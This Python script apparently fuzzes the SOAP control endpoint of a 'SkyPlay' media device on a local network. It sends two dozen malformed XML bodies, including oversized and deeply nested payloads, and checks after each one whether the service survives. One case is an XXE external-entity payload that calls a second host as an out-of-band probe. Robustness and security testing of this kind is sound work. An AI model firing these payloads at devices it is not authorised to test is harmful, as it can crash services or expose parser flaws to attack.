#!/usr/bin/env python3
import http.client
import time
import urllib.request

HOST = "192.168.50.131"
PORT = 49153
PATH = "/444D5276-3247-536B-7943-943bb1c5f496SkyPlay"
SOAP_ACTION = '"urn:schemas-nds-com:service:SkyPlay:2#GetTransportInfo"'


def envelope(argument=b"<InstanceID>0</InstanceID>", soap_ns=b"http://schemas.xmlsoap.org/soap/envelope/"):
    return (
        b'<?xml version="1.0"?>'
        b'<s:Envelope xmlns:s="' + soap_ns + b'">'
        b'<s:Body><u:GetTransportInfo xmlns:u="urn:schemas-nds-com:service:SkyPlay:2">'
        + argument
        + b'</u:GetTransportInfo></s:Body></s:Envelope>'
    )


deep = b"<x>" * 128 + b"0" + b"</x>" * 128
wide = b"".join(b"<x/>" for _ in range(512))
utf16 = envelope().decode("ascii").replace('encoding="1.0"', 'encoding="UTF-16"').encode("utf-16")

CASES = [
    ("empty", b"", "text/xml; charset=utf-8", SOAP_ACTION),
    ("whitespace", b" \r\n\t", "text/xml; charset=utf-8", SOAP_ACTION),
    ("truncated", envelope()[:80], "text/xml; charset=utf-8", SOAP_ACTION),
    ("mismatched-tags", envelope().replace(b"</s:Body>", b"</s:BodY>"), "text/xml; charset=utf-8", SOAP_ACTION),
    ("multiple-roots", envelope() + b"<extra/>", "text/xml; charset=utf-8", SOAP_ACTION),
    ("missing-soap-namespace", envelope().replace(b' xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"', b""), "text/xml; charset=utf-8", SOAP_ACTION),
    ("wrong-soap-namespace", envelope(soap_ns=b"urn:invalid:soap"), "text/xml; charset=utf-8", SOAP_ACTION),
    ("duplicate-attribute", envelope().replace(b"<InstanceID>", b'<InstanceID a="1" a="2">'), "text/xml; charset=utf-8", SOAP_ACTION),
    ("unknown-entity", envelope(b"<InstanceID>&doesnotexist;</InstanceID>"), "text/xml; charset=utf-8", SOAP_ACTION),
    ("invalid-char-reference", envelope(b"<InstanceID>&#0;</InstanceID>"), "text/xml; charset=utf-8", SOAP_ACTION),
    ("numeric-char-reference", envelope(b"<InstanceID>&#48;</InstanceID>"), "text/xml; charset=utf-8", SOAP_ACTION),
    ("cdata", envelope(b"<InstanceID><![CDATA[0]]></InstanceID>"), "text/xml; charset=utf-8", SOAP_ACTION),
    ("comments-pi", envelope(b"<?probe test?><!--comment--><InstanceID>0</InstanceID>"), "text/xml; charset=utf-8", SOAP_ACTION),
    ("internal-doctype", b'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a "0">]>' + envelope(b"<InstanceID>&a;</InstanceID>").split(b"?>", 1)[1], "text/xml; charset=utf-8", SOAP_ACTION),
    ("external-doctype", b'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a SYSTEM "http://192.168.0.163:18080/xml-fuzz">]>' + envelope(b"<InstanceID>&a;</InstanceID>").split(b"?>", 1)[1], "text/xml; charset=utf-8", SOAP_ACTION),
    ("deep-128", envelope(b"<InstanceID>" + deep + b"</InstanceID>"), "text/xml; charset=utf-8", SOAP_ACTION),
    ("wide-512", envelope(b"<InstanceID>0</InstanceID>" + wide), "text/xml; charset=utf-8", SOAP_ACTION),
    ("long-text-64k", envelope(b"<InstanceID>" + b"0" * 65536 + b"</InstanceID>"), "text/xml; charset=utf-8", SOAP_ACTION),
    ("invalid-utf8", envelope(b"<InstanceID>\xff\xfe</InstanceID>"), "text/xml; charset=utf-8", SOAP_ACTION),
    ("embedded-nul", envelope(b"<InstanceID>0\x00</InstanceID>"), "text/xml; charset=utf-8", SOAP_ACTION),
    ("utf16-bom", utf16, "text/xml; charset=utf-16", SOAP_ACTION),
    ("soap12", envelope(soap_ns=b"http://www.w3.org/2003/05/soap-envelope"), "application/soap+xml; charset=utf-8", SOAP_ACTION),
    ("missing-soapaction", envelope(), "text/xml; charset=utf-8", None),
    ("empty-soapaction", envelope(), "text/xml; charset=utf-8", ""),
]


def health():
    with urllib.request.urlopen(f"http://{HOST}:{PORT}/description0.xml", timeout=3) as response:
        return response.status, len(response.read())


for index, (name, body, content_type, soap_action) in enumerate(CASES, 1):
    connection = http.client.HTTPConnection(HOST, PORT, timeout=5)
    headers = {"Content-Type": content_type}
    if soap_action is not None:
        headers["SOAPAction"] = soap_action
    started = time.monotonic()
    try:
        connection.request("POST", PATH, body=body, headers=headers)
        response = connection.getresponse()
        response_body = response.read(2048)
        elapsed_ms = round((time.monotonic() - started) * 1000)
        compact = b" ".join(response_body.split())[:100].decode("latin1", "replace")
        print(f"{index:02d} {name:24s} HTTP={response.status} ms={elapsed_ms} response={compact}", flush=True)
    except Exception as error:
        print(f"{index:02d} {name:24s} REQUEST_FAILURE={error}", flush=True)
    finally:
        connection.close()
    try:
        status, size = health()
        print(f"   health HTTP={status} bytes={size}", flush=True)
    except Exception as error:
        print(f"   HEALTH_FAILURE={error}; stopping", flush=True)
        raise SystemExit(2)

print(f"completed {len(CASES)} cases", flush=True)
